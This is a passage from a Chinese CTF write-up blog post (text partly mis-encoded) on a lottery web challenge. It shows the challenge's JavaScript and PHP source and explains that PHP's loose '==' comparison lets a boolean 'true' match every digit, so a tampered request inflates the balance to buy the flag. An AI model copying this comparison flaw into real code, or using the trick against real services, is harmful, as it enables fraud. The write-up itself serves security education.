class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#wait&#x27;</span>).show();</span><br><span class="line">	$(<span class="string">&#x27;#result&#x27;</span>).hide();</span><br><span class="line">	<span class="keyword">var</span> input = $(<span class="string">&#x27;#numbers&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">if</span>(input.validity.valid)&#123;</span><br><span class="line">		<span class="keyword">var</span> numbers = input.value;</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">		  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">		  <span class="attr">url</span>: <span class="string">&quot;api.php&quot;</span>,                                            <span class="comment">//api.php</span></span><br><span class="line">		  <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">		  <span class="attr">contentType</span>: <span class="string">&quot;application/json&quot;</span>, </span><br><span class="line">		  <span class="attr">data</span>: <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">action</span>: <span class="string">&quot;buy&quot;</span>, <span class="attr">numbers</span>: numbers &#125;)</span><br><span class="line">		&#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(resp.status == <span class="string">&#x27;ok&#x27;</span>)&#123;</span><br><span class="line">				show_result(resp);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				alert(resp.msg);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		alert(<span class="string">&#x27;invalid&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$(<span class="string">&#x27;#wait&#x27;</span>).hide();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#prize&#x27;</span>).text(resp.prize);</span><br><span class="line">	<span class="keyword">var</span> numbers = resp.numbers;</span><br><span class="line">	<span class="keyword">var</span> win_numbers = resp.win_numbers;</span><br><span class="line">	<span class="keyword">var</span> numbers_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">var</span> win_numbers_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">		win_numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-red&quot;&gt;&#x27;</span> + win_numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(numbers[i] == win_numbers[i])&#123;</span><br><span class="line">			numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-red&quot;&gt;&#x27;</span> + numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-gray&quot;&gt;&#x27;</span> + numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$(<span class="string">&#x27;#win&#x27;</span>).html(win_numbers_result);</span><br><span class="line">	$(<span class="string">&#x27;#user&#x27;</span>).html(numbers_result);</span><br><span class="line">	$(<span class="string">&#x27;#money&#x27;</span>).text(resp.money);</span><br><span class="line">	$(<span class="string">&#x27;#result&#x27;</span>).show();</span><br><span class="line">	$(<span class="string">&#x27;#numbers&#x27;</span>).select()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#btnBuy&#x27;</span>).click(buy);	</span><br><span class="line">	$(<span class="string">&#x27;form&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">	  buy();</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>   çœ‹åˆ°æ•°æ®å‘é€åˆ°<code>api.php</code>ï¼Œä¸‹é¢æ˜¯éƒ¨åˆ†æºç ï¼Œå…³é”®å‡½æ•°æ˜¯buyå‡½æ•°ï¼š<br>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// my boss told me to use cryptographically secure algorithm </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="variable">$byte</span> = openssl_random_pseudo_bytes(<span class="number">10</span>, <span class="variable">$cstrong</span>);</span><br><span class="line">		<span class="variable">$num</span> = ord(<span class="variable">$byte</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="variable">$num</span> &gt;= <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$cstrong</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;server need be checked, tell admin&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$num</span> /= <span class="number">25</span>;</span><br><span class="line">	<span class="keyword">return</span> strval(floor(<span class="variable">$num</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_win_nums</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="variable">$result</span> .= random_num();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = random_win_nums();                        <span class="comment">//å¾—åˆ°</span></span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;                <span class="comment">//phpå¼±ç±»å‹æ¯”è¾ƒ</span></span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;                                   <span class="comment">//çŒœå¯¹çš„æ•°å­—</span></span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>åˆ¤æ–­ç›¸ç­‰çš„æ•°å­—ä¸ªæ•°æ—¶ï¼Œç”¨çš„æ˜¯==ï¼Œè¿™ä¸å°±æ˜¯ä¸ªå¼±ç±»å‹æ¼æ´å—ï¼Œboolç±»å‹çš„trueæ˜¯å¯ä»¥å’Œä»»ä½•æ•°æ®å¼±ç±»å‹ç›¸ç­‰çš„</p>
<p>æŠ“åŒ…åˆ·é’±ï¼Œç„¶åä¹°flag</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211018225202078.png" alt="image-20211018225202078"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211018225228580.png" alt="image-20211018225228580"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>Copyrightï¼š </strong>
          
          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        åˆ†äº«
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://sun-ruijiang.github.io/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/" class="article-nav-link">
        <strong class="article-nav-caption">ä¸Šä¸€ç¯‡</strong>
        <div class="article-nav-title">
          
            æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹åŒº
          
        </div>
      </a>
    
    
      <a href="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/" class="article-nav-link">
        <strong class="article-nav-caption">ä¸‹ä¸€ç¯‡</strong>
        <div class="article-nav-title">CTFæ”»é˜²ä¸–ç•Œwebæ–°æ‰‹åŒº2</div>
      </a>
    
  </nav>

  
   
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2021
        <i class="ri-heart-fill heart_icon"></i> Sung
      </li>
    </ul>
    <!-- <ul>
      <li>
        
        
        
        powered_by
        <span class="division">|</span>
        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul> -->
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzzç»Ÿè®¡ -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Sung&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">ä¸»é¡µ</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">å½’æ¡£</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">åˆ†ç±»</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">æ ‡ç­¾</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">å‹é“¾</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">å…³äºæˆ‘</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>è¯·æˆ‘å–æ¯å’–å•¡å§~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">æ”¯ä»˜å®</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">å¾®ä¿¡</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // sliderå±•å¼€çŠ¶æ€
                // todo: è¿™æ ·ä¸å¥½ï¼Œåé¢æ”¹æˆçŠ¶æ€
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // è·å¾—åŸå›¾å°ºå¯¸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>


<!-- ClickBoom2 -->

<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>



    
  </div>
</body>

</html>